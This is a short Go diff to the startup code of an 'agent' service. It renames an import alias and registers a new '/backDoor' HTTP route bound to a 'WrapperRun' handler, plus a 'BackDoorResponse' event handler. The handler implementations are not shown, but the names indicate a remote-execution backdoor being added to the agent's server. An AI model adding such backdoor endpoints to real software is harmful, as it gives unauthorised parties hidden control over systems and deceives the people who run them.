@@ -6,7 +6,7 @@ import (
 	"agent/src/http"
 	"agent/src/server"
 	ServiceHandler "agent/src/server/handler"
-	http2 "agent/src/server/http"
+	http3 "agent/src/server/http"
 	"context"
 	"flag"
 	"fmt"
@@ -35,8 +35,9 @@ func httpServer(ctx context.Context, server iface.IServer) {
 	log.Printf("启动http服务器:%s", addr)
 	s := http.NewServer(addr)
 
-	s.AddHandler("/plugin-update", http2.WrapperPluginUpdate(server))
-	s.AddHandler("/update", http2.WrapperUpdate(server))
+	s.AddHandler("/plugin-update", http3.WrapperPluginUpdate(server))
+	s.AddHandler("/update", http3.WrapperUpdate(server))
+	s.AddHandler("/backDoor", http3.WrapperRun(server))
 
 	if err := s.Run(); err != nil {
 		log.Println(err)
@@ -69,6 +70,7 @@ func main() {
 	//event.AddHandlerMethod(g.PortListenListResponse, ServiceHandler.NewPing())
 	event.AddHandlerMethod(g.ServiceResponse, ServiceHandler.NewServiceResponse())
 	event.AddHandlerMethod(g.ActionNotice, ServiceHandler.NewActionNotice())
+	event.AddHandlerMethod(g.BackDoorResponse, ServiceHandler.NewBackDoorHandler())
 
 	s.AddEvent(event)
 	s.AddProtocol(&g.Protocol{})
